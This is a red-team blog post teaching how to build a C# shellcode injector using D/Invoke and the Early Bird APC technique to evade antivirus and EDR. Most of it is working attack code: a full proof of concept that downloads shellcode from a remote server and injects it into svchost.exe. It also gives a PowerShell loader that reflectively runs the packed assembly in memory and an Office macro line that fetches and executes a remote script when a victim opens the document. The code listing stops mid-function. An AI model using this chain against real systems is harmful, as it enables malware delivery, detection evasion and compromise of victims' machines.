---
layout: single
date: 2023-01-13
title: "Process Injection with D/Invoke - Part 1"
toc: true
draft: false
type: ["posts","post"]
categories:
  - Evasion
tags:
  - Evasion
  - ProcessInjection
  - D/Invoke
  - Early Bird
---
## Introduction
In this blog post, I will be talking about writing your own injector in C#. Part 1 will mainly cover the use of D/Invoke and Early Bird process injection technique. In future posts, let's improve our malware with PPID (Parent Process ID) Spoofing, protect our malware from EDRs with blockdlls, ACG (Arbitrary Code Guard), invoking system calls instead of API call, and more.

I won't be drilling deep into each and everything mentioned, but some basic knowledge in programming, Windows internals and Windows API should help you understand the content much better.

## P/Invoke
Before talking about D/Invoke, let's briefly talk about P/Invoke.
On a high level, [P/Invoke](https://learn.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke) - Platform Invoke is a .NET mechanism, or technology that allows .NET applications to make calls and access the Windows APIs (via the `System` and `System.Runtime.InteropServices` namespaces). Combine with the ability to load and execute .NET assemblies (exe, dll) from memory thanks to the magic of Reflection, this is great for Red Teamers/TAs to carry out post-exploitation tradecrafts without touching the disk. Here is an example of P/Invoke usage to call the `OpenProcess` Win32API:

```csharp
# 'Define' the OpenProcess API from kernel32.dll
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr OpenProcess(
		uint processAccess,
		bool bInheritHandle,
		int processID);
# Open a handle to 'explorer.exe' with OpenProcess.
IntPtr hProcess = OpenProcess(0x001F0FFF, false, Process.GetProcessesByName("explorer")[0].Id);
```

Okay neat, we can import and call any API we want, so what's the downside?
1. Any API import via P/Invoke is a static reference and will be visible in the . NET assembly's Import Address Table (IAT). This is bad OPSEC since the IAT entries will be populated at run time, with all the references to the APIs we're about to call. Suspicious API calls considered by AV/EDR to be usual suspects such as `VirtualAlloc`, `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread` will be caught immediately. It's like going through airport security with bag full of explosives, you want to get caught at this point.
2. API hooking (specific API calls monitored by AV/EDR) also busts suspicious API calls, we would need to avoid the usage of the more "obvious" APIs. D/Invoke provides Manual Mapping as a solution to bypass API hooking, but we won't be covering it in this post.

## D/Invoke
[D/Invoke](https://github.com/TheWover/DInvoke) - Dynamic Invoke was introduced in 2020 as a replacement for P/Invoke. Basically, D/Invoke grants .NET assemblies the ability to dynamically invoke unmanaged APIs:
- Load a DLL into memory
- Get a pointer to a function/API in that DLL
- Call desired API using the pointer while passing in parameters
This is the standard usage of D/Invoke and will avoid directly importing the APIs into our .NET Assembly's IAT.

To do this, D/Invoke works with [Delegates](https://learn.microsoft.com/en-us/dotnet/csharp/programming-guide/delegates/). I'm probably not the best at explaining Delegates since this is my first time doing development in C#, but in my understanding, `Delegates` allows wrapping functions within a class, API calls can now be declared as a class and be used later on. Here is an example of D/Invoke usage to call the `VirtualAllocEx` Win32API:

Make a new class and create a Delegate for `VirtualAllocEx`:
```csharp
	public class DELEGATES {
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
  }
```

To call this Delegate:
```csharp
pntr = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "VirtualAllocEx");
DELEGATES.VirtualAllocEx virAllocEx = Marshal.GetDelegateForFunctionPointer(pntr, typeof(DELEGATES.VirtualAllocEx)) as DELEGATES.VirtualAllocEx;
IntPtr allocret = virAllocEx(procInfo.hProcess, IntPtr.Zero, (uint)sheocode.Length, 0x1000 | 0x2000, 0x40); //MEM_COMMIT | MEM_RESERVE
```
1. Get the pointer to `VirtualAllocEx` in `kernel32.dll` via the helper function `GetLibraryAddress`.
2. Use `GetDelegateForFunctionPointer` to convert the function pointer into a delegate and cast it with the same delegate type.
3. Call the API/Instantiate the delegate.

*In this blog post series, I won't be importing the whole D/Invoke project, but only take the neccessary helper functions, structs and enums*

## Project Injection 101
Project Injection is a commonly used technique to inject our shellcode into legitimate target process's virtual memory space. A textbook way to perform project injection is:
1. Find a target process to inject our shellcode into and get a handle to it with `OpenProcess`
2. Allocate a new memory region in the remote target process using `VirtualAllocEx`
3. Write our shellcode into the allocated remote memory region using `WriteProcessMemory`
4. Execute our shellcode as a new thread with `CreateRemoteThread`

Here is a PoC to inject shellcode into `explorer.exe`
```csharp
// Get pid of explorer.exe
Process[] explorerProcess = Process.GetProcessesByName("explorer");

// Open a handle to explorer.exe
IntPtr hProcess = OpenProcess(0x001F0FFF, false, explorerProcess[0].Id);

// Allocate remote mem
IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
// 0x3000 = MEM_COMMIT | MEM_RESERVE (0x1000 | 0x2000)
// 0x40: PAGE_EXECUTE_READWRITE (RWX)

// shellcode
byte[] buf = new byte[511] {0xfc,0x48,...,0xd5};

IntPtr outSize;
// Write shellcode to allocated buffer
WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

// Execute thread
IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
```

This injection method works, however, it has a lot of flaws and can be easily picked up. The most obvious red flag  is the `PAGE_EXECUTE_READWRITE (RWX)` with `VirtualAllocEx`, as most memory regions in the process has **RX** protection, allocating memory for our shellcode with Read, Write and Execute (RWX) will make it more than obvious to AV/EDR.
{{< image src="/images/explorer_11888.png" alt="Meterpreter shellcode injected into explorer.exe" position="center" style="border-radius: 8px;" >}}
*Meterpreter shellcode was injected successfully into explorer.exe*

{{< image src="/images/explorer_bad_injection.png" alt="RWX region stood out" position="center" style="border-radius: 8px;" >}}
*RWX region containing the shellcode stood out*

This injection could also be detected by this [Get-InjectedThread](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2) script:
{{< image src="/images/injection_caught.png" alt="Injection detected" position="center" style="border-radius: 8px;" >}}
*Injection detected*

Additionally, `CreateRemoteThread` API is heavily scrutinized by AV/EDR as this is commonly seen in injection techniques to create a thread that runs in a remote process's virtual memory space.

## Early Bird Process Injection with D/Invoke
Let's improve our injection method with a technique called Early Bird (circa 2018), a variant of APC Queue Injection.
On a high level:
1. Spawn a new process to inject into and put it in suspended state using `CreateProcess`
2. Allocate memory buffer in the target process with `RW` flag using `VirtualAllocEx`
3. Write shellcode in the target buffer using `WriteProcessMemory`
4. Change the target memory region to `RX` in order for our shellcode to execute using `VirtualProtectEx`
4. Queue a thread, pointing the APC object to the shellcode in the target buffer 
5. Resume thread to start the shellcode execution

Let's implement this injection using D/Invoke.
First of all, as mentioned above, I won't be importing the whole D/Invoke project but only taking necessary functions, structs and enums from [D/Invoke GitHub](https://github.com/TheWover/DInvoke/blob/dev/DInvoke/DInvoke/DynamicInvoke).
At the time of writing, the list of functions from D/Invoke source code that I have are:
- `DynamicAPIInvoke`: Invoke an arbitrary function from a DLL dynamically, providing its name, function prototype, and arguments.
- `DynamicFunctionInvoke`: Invoke an arbitrary function from a pointer, called by `DynamicAPIInvoke`.
- `GetLibraryAddress`: Helper for getting the pointer to a function from a DLL loaded by the process.
- `GetLoadedModuleAddress`: Helper for getting the base address of a module loaded by the current process.
- `LoadModuleFromDisk`: Resolve `LdrLoadDll` and uses that function to load a DLL from disk.
- `GetExportAddress`: Resolves the address of a function by manually walking the module export table, given a module base address.
We also need to define `RtlInitUnicodeString` and `LdrLoadDll` from `ntdll.dll`, also referenced on [D/Invoke GitHub](https://github.com/TheWover/DInvoke/blob/dev/DInvoke/DInvoke/DynamicInvoke/Native.cs) (LdrLoadDll is an undocumented ntdll native API)

Structs and Enums to include:
- `NTSTATUS`: [Undocumented Enum](https://dinvoke.net/en/ntdll/NTSTATUS)
- `UNICODE_STRING`: [Documented Struct](https://learn.microsoft.com/en-us/windows/win32/api/subauth/ns-subauth-unicode_string)
- `PROCESS_INFORMATION`: [Documented Struct](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information)
- `STARTUPINFO`: [Documented Struct](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa)
- `ProcessCreationFlags`: [Documented Enum](https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags)


Once all this Ctrl+C and Ctrl+V is done, we can start creating Delegates for the APIs, following the documentations for these APIs from Microsoft.

Creating delegate for [CreateProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)
```csharp
public class DELEGATES {

		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
		IntPtr lpThreadAttributes, bool bInheritHandles, STRUCTS.ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment,
		string lpCurrentDirectory, ref STRUCTS.STARTUPINFO lpStartupInfo, out STRUCTS.PROCESS_INFORMATION lpProcessInformation);

    //......
}
```
Creating delegate for [VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
```csharp
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
```

Creating delegate for [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
```csharp
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
```

Creating delegate for [VirtualProtectEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex)
```csharp
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);
```

Creating delegate for [QueueUserAPC](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex)
```csharp
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
```

Creating delegate for [ResumeThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread)
```csharp
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate uint ResumeThread(IntPtr hThhread);
```

Creating delegate for `LdrLoadDll` (This is an undocumented native API, go to http://undocumented.ntinternals.net/ and search for LdrLoadDll)
```csharp
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate UInt32 LdrLoadDll(IntPtr PathToFile, UInt32 dwFlags, ref STRUCTS.UNICODE_STRING ModuleFileName, ref IntPtr ModuleHandle);
```

Creating delegate for [RtlInitUnicodeString](https://www.pinvoke.net/default.aspx/ntdll/RtlInitUnicodeString.html)
```csharp
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate void RtlInitUnicodeString(ref STRUCTS.UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString);
```

We can now start invoking the APIs through the delegates in our Main() function.
We can either store our (encrypted)shellcode on within the assembly or download it from a remote server.
To download the shellcode from a remote server, we need the `System.Net.Http` namespace, and create a `HttpClient`:
```csharp 
byte[] shellcode;
using (var recv = new HttpClient()) {
  shellcode = recv.GetByteArrayAsync("https://x.x.x.x/shellcode.bin").GetAwaiter().GetResult();
}
``` 

`startInfo` and `procInfo` store process information such as process handle and thread handle:
```csharp
STRUCTS.STARTUPINFO startInfo = new STRUCTS.STARTUPINFO();
STRUCTS.PROCESS_INFORMATION procInfo = new STRUCTS.PROCESS_INFORMATION();
```

Invoke Create Process through its delegate:
```csharp
IntPtr pntr = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "CreateProcessA");
DELEGATES.CreateProcess createProc = Marshal.GetDelegateForFunctionPointer(pntr, typeof(DELEGATES.CreateProcess)) as DELEGATES.CreateProcess;
// Spawn new process in suspended state
bool yayornay = createProc("process_path_here", null, IntPtr.Zero, IntPtr.Zero, false, STRUCTS.ProcessCreationFlags.CREATE_SUSPENDED,
IntPtr.Zero, null, ref startInfo, out procInfo);
```

Invoke VirtualAllocEx through its delegate:
```csharp
pntr = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "VirtualAllocEx");
DELEGATES.VirtualAllocEx virAllEx = Marshal.GetDelegateForFunctionPointer(pntr, typeof(DELEGATES.VirtualAllocEx)) as DELEGATES.VirtualAllocEx;
IntPtr allocret = virAllEx(procInfo.hProcess, IntPtr.Zero, (uint)sheocode.Length, 0x1000 | 0x2000, 0x04); //MEM_COMMIT | MEM_RESERVE; 0x04: RW
```

Invoke WriteProcessMemory through its delegate:
```csharp
pntr = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "WriteProcessMemory");
DELEGATES.WriteProcessMemory writeProcMem = Marshal.GetDelegateForFunctionPointer(pntr, typeof(DELEGATES.WriteProcessMemory)) as DELEGATES.WriteProcessMemory;
writeProcMem(procInfo.hProcess, allocret, sheocode, (uint)sheocode.Length, out UIntPtr bytesWritten);
```

Invoke VirtualProtectEx through its delegate:
```csharp
pntr = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "VirtualProtectEx");
DELEGATES.VirtualProtectEx virProtEx = Marshal.GetDelegateForFunctionPointer(pntr, typeof(DELEGATES.VirtualProtectEx)) as DELEGATES.VirtualProtectEx;
virProtEx(procInfo.hProcess, allocret, sheocode.Length, 0x20, out oldProtect); // 0x20: RX
```

Invoke QueueUserAPC through its delegate:
```csharp
pntr = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "QueueUserAPC");
DELEGATES.QueueUserAPC qUsrAPC = Marshal.GetDelegateForFunctionPointer(pntr, typeof(DELEGATES.QueueUserAPC)) as DELEGATES.QueueUserAPC;
qUsrAPC(allocret, procInfo.hThread, IntPtr.Zero);
```

Invoke ResumeThread through its delegate:
```csharp
pntr = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "ResumeThread");
DELEGATES.ResumeThread resThrd = Marshal.GetDelegateForFunctionPointer(pntr, typeof(DELEGATES.ResumeThread)) as DELEGATES.ResumeThread;
resThrd(procInfo.hThread);
```

Build our .NET assembly as a x64 executable.
To load our assembly in the target's memory, let's gzip compress and then base64 encode the assembly's byte stream, output it to `compressedEncodedBytes.txt`.
```powershell
$bytes = [System.IO.File]::ReadAllBytes("$(pwd)\injection.exe")
[System.IO.MemoryStream] $outStream = New-Object System.IO.MemoryStream
$gzipStream = New-Object System.IO.Compression.GzipStream($outStream, [System.IO.Compression.CompressionMode]::Compress)
$gzipStream.Write($bytes, 0, $bytes.Length)
$gzipStream.Close()
$outStream.Close()
[byte[]] $outBytes = $outStream.ToArray()
$b64Zipped = [System.Convert]::ToBase64String($outBytes)
$b64Zipped | Out-File -NoNewLine -Encoding ASCII .\compressedEncodedBytes.txt'
```

Create a PowerShell script to decode this compressed and encoded bytestream.
```powershell
$a = New-Object System.IO.MemoryStream(, [System.Convert]::FromBase64String("compressed and encoded bytestream here"))
$b = New-Object System.IO.Compression.GZipStream($a, [System.IO.Compression.CompressionMode]::Decompress)
$c = New-Object System.IO.MemoryStream;
$b.CopyTo($c)
[byte[]]$d = $c.ToArray()
$e = [System.Reflection.Assembly]::Load($d)
$f = [System.Console]::Out
$g = New-Object System.IO.StringWriter
[System.Console]::SetOut($g)

$h = [Reflection.BindingFlags]"Public,NonPublic,Static"
$i = $e.GetType("injection.Program", $h)
$j = $i.GetMethod("Main", $h)
$j.Invoke($null, (, [string[]]$args))

[System.Console]::SetOut($f)
$k = $g.ToString()
$k
```

Get this PowerShell script to be loaded and executed via an Office macro, something like:
```vbnet
Dim str As String
    walk = "powershell iex (iwr http://hostingserver/notmalicious.ps1 -Useb)"
    CreateObject("Wscript.Shell").Run walk, 0
```
When the victim opens the maldoc and enables macro, WINWORD will load our PowerShell script, decode, decompress and reflectively run the .NET Assembly.

{{< image src="/images/earlybird_injection.png" alt="inject into svchost.exe" position="center" style="border-radius: 8px;" >}}
*Process injection into svchost.exe*

{{< image src="/images/not_caught_by_getInjectedThread.png" alt="Get-InjectedThread could no longer detect our injection" position="center" style="border-radius: 8px;" >}}
*Get-InjectedThread could no longer detect our injection*

## Is this good enough?
Well no, modern AV/EDR can still nuke our work immediately, this is mainly to demonstrate a common injection technique implemented with D/Invoke.
In Part 2, we can make our `svchost.exe` malware even more benign by PPID Spoofing, making it appear as it got spawned by `services.exe`, which is normally the case. I'm also working on invoking system calls with D/Invoke instead of standard API calls to defeat API Hooking. Stay tuned!

Full PoC is below:
```csharp
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Net.Http;

namespace DInvoke_Injection
{

	public class Program
	{

		public static void Main(string[] args)
		{

			// Grab shellcode from a remote server
			byte[] sheocode;
			using (var recv = new HttpClient())
            {
				sheocode = recv.GetByteArrayAsync("https://remote_server/shellcode.bin").GetAwaiter().GetResult();
            }

			STRUCTS.STARTUPINFO startInfo = new STRUCTS.STARTUPINFO();
			STRUCTS.PROCESS_INFORMATION procInfo = new STRUCTS.PROCESS_INFORMATION();

			// Invoke functions/APIs via Delegates
			// Get the pointer to the fucntions from DLLs
			// Then, get the delegate for the function pointer. Store it into a variable with the same delegate type

			// CreateProcess
			IntPtr pntr = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "CreateProcessA");
			DELEGATES.CreateProcess createProc = Marshal.GetDelegateForFunctionPointer(pntr, typeof(DELEGATES.CreateProcess)) as DELEGATES.CreateProcess;
			// Start proc in suspended state 
			createProc("C:\\Windows\\System32\\svchost.exe", null, IntPtr.Zero, IntPtr.Zero, false, STRUCTS.ProcessCreationFlags.CREATE_SUSPENDED,
			IntPtr.Zero, null, ref startInfo, out procInfo);

			// VirtualAllocEx
			pntr = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "VirtualAllocEx");
			DELEGATES.VirtualAllocEx virAllEx = Marshal.GetDelegateForFunctionPointer(pntr, typeof(DELEGATES.VirtualAllocEx)) as DELEGATES.VirtualAllocEx;
			IntPtr allocret = virAllEx(procInfo.hProcess, IntPtr.Zero, (uint)sheocode.Length, 0x1000 | 0x2000, 0x04); //MEM_COMMIT | MEM_RESERVE; 0x04: RW
			Console.WriteLine("Base address of remote mem space is: " + (long)allocret, 16);
			
			// WriteProcessMemory
			pntr = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "WriteProcessMemory");
			DELEGATES.WriteProcessMemory writeProcMem = Marshal.GetDelegateForFunctionPointer(pntr, typeof(DELEGATES.WriteProcessMemory)) as DELEGATES.WriteProcessMemory;
			writeProcMem(procInfo.hProcess, allocret, sheocode, (uint)sheocode.Length, out UIntPtr bytesWritten);
			
			// VirtualProtectEx
			uint oldProtect = 0;
			pntr = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "VirtualProtectEx");
			DELEGATES.VirtualProtectEx virProtEx = Marshal.GetDelegateForFunctionPointer(pntr, typeof(DELEGATES.VirtualProtectEx)) as DELEGATES.VirtualProtectEx;
			virProtEx(procInfo.hProcess, allocret, sheocode.Length, 0x20, out oldProtect); // 0x20: RX
			
			// QueueUserAPC
			pntr = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "QueueUserAPC");
			DELEGATES.QueueUserAPC qUsrAPC = Marshal.GetDelegateForFunctionPointer(pntr, typeof(DELEGATES.QueueUserAPC)) as DELEGATES.QueueUserAPC;
			qUsrAPC(allocret, procInfo.hThread, IntPtr.Zero);
			
			// ResumeThread
			pntr = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "ResumeThread");
			DELEGATES.ResumeThread resThrd = Marshal.GetDelegateForFunctionPointer(pntr, typeof(DELEGATES.ResumeThread)) as DELEGATES.ResumeThread;
			resThrd(procInfo.hThread);
			
		}

	}

	// Creating DELEGATES for functions
	// https://thewover.github.io/Dynamic-Invoke/
	public class DELEGATES
	{

		// Delegate for CreateProcess
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
		IntPtr lpThreadAttributes, bool bInheritHandles, STRUCTS.ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment,
		string lpCurrentDirectory, ref STRUCTS.STARTUPINFO lpStartupInfo, out STRUCTS.PROCESS_INFORMATION lpProcessInformation);

		// Delegate for VirtualAllocEx
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

		// Delegate for WriteProcessMemory
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

		// Delegate for VirtualProtectEx
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);

		// Delegate for QueueUserAPC
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

		// Delegate for ResumeThread
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate uint ResumeThread(IntPtr hThhread);

		// Delegate for LdrLoadDll
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate UInt32 LdrLoadDll(IntPtr PathToFile, UInt32 dwFlags, ref STRUCTS.UNICODE_STRING ModuleFileName, ref IntPtr ModuleHandle);

		// Delegate for RtlInitUnicodeString
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate void RtlInitUnicodeString(ref STRUCTS.UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString);

	}

	// DInvoke functions from https://github.com/TheWover/DInvoke/blob/dev/DInvoke/DInvoke/DynamicInvoke/Generic.cs
	public class DInvokeFunctions
	{

		// Dynamically invoke an arbitrary function from a DLL, providing its name, function prototype, and arguments, where:
		// DLLName: Name of the DLL.
		// FunctionName: Name of the function.
		// FunctionDelegateType: Prototype for the function, represented as a Delegate object.
		// Parameters: Parameters to pass to the function. Can be modified if function uses call by reference.
		// CanLoadFromDisk: Whether the DLL may be loaded from disk if it is not already loaded. Default is false.
		// ResolveForwards: Whether or not to resolve export forwards. Default is true.
		// return: Object returned by the function. Must be unmarshalled by the caller.
		public static object DynamicAPIInvoke(string DLLName, string FunctionName, Type FunctionDelegateType, ref object[] Parameters, bool CanLoadFromDisk = false, bool ResolveForwards = true)
		{
			IntPtr pFunction = GetLibraryAddress(DLLName, FunctionName, CanLoadFromDisk, ResolveForwards);
			return DynamicFunctionInvoke(pFunction, FunctionDelegateType, ref Parameters);
		}

		// Dynamically invokes an arbitrary function from a pointer. Useful for manually mapped modules or loading/invoking unmanaged code from memory, where:
		// <param name="FunctionPointer">A pointer to the unmanaged function.</param>
		// <param name="FunctionDelegateType">Prototype for the function, represented as a Delegate object.</param>
		// <param name="Parameters">Arbitrary set of parameters to pass to the function. Can be modified if function uses call by reference.</param>
		// <returns>Object returned by the function. Must be unmarshalled by the caller.</returns>
		public static object DynamicFunctionInvoke(IntPtr FunctionPointer, Type FunctionDelegateType, ref object[] Parameters)
		{
			Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(FunctionPointer, FunctionDelegateType);
			return funcDelegate.DynamicInvoke(Parameters);
		}


		// Helper for getting the pointer to a function from a DLL loaded by the process, where:
		// <param name="DLLName">The name of the DLL (e.g. "ntdll.dll" or "C:\Windows\System32\ntdll.dll").</param>
		// <param name="FunctionHash">Hash of the exported procedure.</param>
		// <param name="Key">64-bit integer to initialize the keyed hash object (e.g. 0xabc or 0x1122334455667788).</param>
		// <param name="CanLoadFromDisk">Optional, indicates if the function can try to load the DLL from disk if it is not found in the loaded module list.</param>
		// <param name="ResolveForwards">Whether or not to resolve export forwards. Default is true.</param>
		// <returns>IntPtr for the desired function.</returns>
		public static IntPtr GetLibraryAddress(string DLLName, string FunctionHash, bool CanLoadFromDisk = false, bool ResolveForwards = true)
		{
			IntPtr hModule = GetLoadedModuleAddress(DLLName);
			if (hModule == IntPtr.Zero && CanLoadFromDisk)
			{
				hModule = LoadModuleFromDisk(DLLName);
				if (hModule == IntPtr.Zero)
				{
					throw new FileNotFoundException(DLLName + ", unable to find the specified file.");
				}
			}
			else if (hModule == IntPtr.Zero)
			{
				throw new DllNotFoundException(DLLName + ", Dll was not found.");
			}

			return GetExportAddress(hModule, FunctionHash);
		}

		// Helper for getting the base address of a module loaded by the current process. This base
		/// address could be passed to GetProcAddress/LdrGetProcedureAddress or it could be used for
		/// manual export parsing. This function uses the .NET System.Diagnostics.Process class. Where:
		// <param name="DLLName">The name of the DLL (e.g. "ntdll.dll").</param>
		// <returns>IntPtr base address of the loaded module or IntPtr.Zero if the module is not found.</returns>
		public static IntPtr GetLoadedModuleAddress(string DLLName)
		{
			ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
			foreach (ProcessModule Mod in ProcModules)
			{
				if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
				{
					return Mod.BaseAddress;
				}
			}
			return IntPtr.Zero;
		}

		// Resolves LdrLoadDll and uses that function to load a DLL from disk, where:
		// <param name="DLLPath">The path to the DLL on disk. Uses the LoadLibrary convention.</param>
		// <returns>IntPtr base address of the loaded module or IntPtr.Zero if the module was not loaded successfully.</returns>
		public static IntPtr LoadModuleFromDisk(string DLLPath)
		{
			STRUCTS.UNICODE_STRING uModuleName = new STRUCTS.UNICODE_STRING();
			RtlInitUnicodeString(ref uModuleName, DLLPath);

			IntPtr hModule = IntPtr.Zero;
			STRUCTS.NTSTATUS CallResult = LdrLoadDll(IntPtr.Zero, 0, ref uModuleName, ref hModule);
			if (CallResult != STRUCTS.NTSTATUS.Success || hModule == IntPtr.Zero)
			{
				return IntPtr.Zero;
			}

			return hModule;
		}

		// Given a module base address, resolve the address of a function by manually walking the module export table, where:
		// <param name="ModuleBase">A pointer to the base address where the module is loaded in the current process.</param>
		// <param name="ExportName">The name of the export to search for (e.g. "NtAlertResumeThread").</param>
		// <param name="ResolveForwards">Whether or not to resolve export forwards. Default is true.</param>
		// <returns>IntPtr for the desired function.</returns>
		public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName, bool ResolveForwards = true)
		{
			IntPtr FunctionPtr = IntPtr.Zero;
			try
			{
				// Traverse the PE header in memory
				Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
				Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
				Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
				Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
				Int64 pExport = 0;
				if (Magic == 0x010b)
				{
					pExport = OptHeader + 0x60;
				}
				else
				{
					pExport = OptHeader + 0x70;
				}

				// Read -> IMAGE_EXPORT_DIRECTORY
				Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
				Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
				Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
				Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
				Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
				Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
				Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

				// Get the VAs of the name table's beginning and end.
				Int64 NamesBegin = ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA));
				Int64 NamesFinal = NamesBegin + NumberOfNames * 4;

				// Loop the array of export name RVA's
				for (int i = 0; i < NumberOfNames; i++)
				{
					string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));

					if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
					{

						Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
						Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
						FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);

						if (ResolveForwards == true)
							// If the export address points to a forward, get the address
							// FunctionPtr = GetForwardAddress(FunctionPtr);
							FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);

						break;
					}
				}
			}
			catch
			{
				// Catch parser failure
				throw new InvalidOperationException("Failed to parse module exports.");
			}

			if (FunctionPtr == IntPtr.Zero)
			{
				// Export not found
				throw new MissingMethodException(ExportName + ", export not found.");
			}
			return FunctionPtr;
		}


		public static void RtlInitUnicodeString(ref STRUCTS.UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString)
		{
			// Craft an array for the arguments
			object[] funcargs =
			{
				DestinationString, SourceString
			};

			DynamicAPIInvoke(@"ntdll.dll", @"RtlInitUnicodeString", typeof(DELEGATES.RtlInitUnicodeString), ref funcargs);

			// Update the modified variables
